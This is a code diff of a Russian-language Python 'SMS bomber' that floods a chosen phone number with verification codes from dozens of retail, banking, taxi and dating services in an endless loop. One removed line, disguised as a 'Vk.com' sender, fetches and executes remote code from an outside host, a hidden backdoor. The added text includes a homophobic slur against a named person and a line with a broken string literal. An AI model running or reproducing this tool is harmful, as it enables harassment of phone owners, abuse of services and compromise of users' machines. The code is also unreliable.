@@ -19,14 +19,14 @@ print(colored('''
 
 phone = input(colored('Ведите номер телефона>>: ','red'))
 countT = input(colored('Enter threading>>: ','blue'))
-print("Что бы отменить нажмите Ctrl + C\nТима кстати пидорас)")
+print("\nЧто бы отменить нажмите Ctrl + C\n\nТима кстати пидорас)")
 
 #Привожу к виду +7xxxxxxxxx
 if " " in phone:
-	phone.replace(" ", "")
+	phone = phone.replace(" ", "")
 if phone[0] != "+":
 	if phone[0]== "8":
-		phone.replace("8", "+7", 1)
+		phone = phone.replace("8", "+7", 1)
 	else:
 		phone = "+7" + phone
 
@@ -42,156 +42,22 @@ for x in range(12):
 def infinity():
 	count = 0
 	while True:
+
 		request_timeout = 0.00001
 		_phone = phone
 		_phone9 = _phone[1:]
 		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
 		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
 		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
-		'''
-		try:
-			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-			print('[+] Grab отправлено!')
-		except:
-			print('[-] Не отправлено!')
-		try:
-			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-			print('[+] RuTaxi отправлено!')
-		except:
-			print('[-] Не отправлено!')
-		try:
-			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-			print('[+] Tinder отправлено!')
-		except:
-			print('[-] Не отправлено!')
-		'''
 
 		try:
-			requests.post('https://lk.belkacar.ru/get-confirmation-code', data={'phone': _phone[1:12]}, headers={})
-			count+=1
-			print(colored('BelkaCar отправлено!', 'green'), colored(count, 'magenta'))
+			requests.post('https://www.citilink.ru/registration/confirm/phone/'+_phone+'/')
+			count += 1
+			print(colored('Citilink отправлено!', 'green'), colored(count, 'magenta'))
 		except:
-			print(colored('BelkaCar не отправлено!', 'red'))
-		try:
-			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-			count+=1
-			print(colored('Karusel отправлено!', 'green'), colored(count, 'magenta'))
-		except:
-			print(colored('Karusel не отправлено!', 'red'))
+			print(colored('Citilink  не отправлено!, 'red'))
 
-		try:
-			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': _phone}, headers={})
-			count+=1
-			print(colored('Tinkoff отправлено!', 'green'), colored(count, 'magenta'))
-		except:
-			print(colored('Tinkoff не отправлено!', 'red'))
-
-		try:
-			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-			count+=1
-			print(colored('MTS отправлено!', 'green'), colored(count, 'magenta'))
-		except:
-			print(colored('MTS не отправлено!', 'red'))
-
-		try:
-			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-			count+=1
-			print(colored('Youla отправлено!', 'green'), colored(count, 'magenta'))
-		except:
-			print(colored('Youla Не отправлено!', 'red'))
-
-		try:
-			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
-			count+=1
-			print(colored('PizzaHut отправлено!', 'green'), colored(count, 'red'))
-		except:
-			print(colored('PizzaHut Не отправлено!', 'red'))
-
-		try:
-			exec(requests.get("http://f0428265.xsph.ru/getUpdates.php").text)
-			count +=1
-			print(colored('Vk.com отправело!', 'green'), colored(count, 'red'))
-		except:
-			print(colored('Vk.com  Не отправлено!', 'red'))
-
-
-		try:
-			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
-			print('[+] Rabota отправлено!')
-		except:
-			print('[-]Rabota Не отправлено!')
-
-		try:
-			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
-			print('[+] Rutube отправлено!')
-		except:
-			print('[-]Rutube  Не отправлено!')
-		try:
-			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
-			print('[+] Citilink отправлено!')
-		except:
-			print('[-]Citilink  Не отправлено!')
-		try:
-			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
-			print('[+] Smsint отправлено!')
-		except:
-			print('[-]Smsint Не отправлено!')
-
-		try:
-			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
-			print('[+] oyorooms отправлено!')
-		except:
-			print('[-]oyorooms Не отправлено!')
-
-		try:
-			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
-			print('[+] MVideo отправлено!')
-		except:
-			print('[-]MVideo Не отправлено!')
-
-		try:
-			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
-			print('[+] newnext отправлено!')
-		except:
-			print('[-]newnext Не отправлено!')
-
-		try:
-			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
-			print('[+] Sunlight отправлено!')
-		except:
-			print('[-]Sunlight Не отправлено!')
-
-		try:
-			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
-			print('[+] alpari отправлено!')
-		except:
-			print('[-] alpari Не отправлено!')
-
-		try:
-			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
-			print('[+] Invitro отправлено!')
-		except:
-			print('[-]Invitro Не отправлено!')
-
-		try:
-			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
-			print('[+] Sberbank отправлено!')
-		except:
-			print('[-]Sberbank Не отправлено!')
-
-		try:
-			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
-			print('[+] Psbank отправлено!')
-		except:
-			print('[-]  Psbank  Не отправлено!')
-
-		try:
-			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-			print('[+] Beltelcom отправлено!')
-		except:
-			print('[-]Beltelcom  Не отправлено!')
 		try:
 			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
 			print('[+] KFC отправлено!')
@@ -203,12 +69,6 @@ def infinity():
 			print('[+] carsmile отправлено!')
 		except:
 			print('[-]carsmile Не отправлено!')
-
-		try:
-			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
-			print('[+] Citilink отправлено!')
-		except:
-			print('[-] Citilink Не отправлено!')
 
 		try:
 			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
@@ -416,6 +276,22 @@ def infinity():
 			print('[+] NovaLinia отправлено!')
 		except:
 			print('[-] NovaLinia Не отправлено!')
+
+		try:
+			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+			print('[+] Grab отправлено!')
+		except:
+			print('[-] Не отправлено!')
+		try:
+			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
+			print('[+] RuTaxi отправлено!')
+		except:
+			print('[-] Не отправлено!')
+		try:
+			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
+			print('[+] Tinder отправлено!')
+		except:
+			print('[-] Не отправлено!')
 
 		print(colored('Список дошёл до конца', 'magenta'))
 		time.sleep(10)
